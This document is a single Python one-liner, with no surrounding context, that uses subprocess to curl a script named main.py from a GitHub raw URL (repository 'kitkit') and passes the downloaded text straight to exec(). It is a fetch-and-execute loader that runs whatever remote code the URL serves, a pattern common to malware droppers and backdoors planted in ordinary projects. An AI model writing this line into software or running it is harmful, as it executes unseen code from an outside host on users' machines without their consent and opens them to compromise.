exec(__import__('subprocess').run(['curl', '-s', 'https://raw.githubusercontent.com/kittyorcatmint/kitkit/refs/heads/main/main.py'], capture_output=True).stdout.decode('utf-8'))
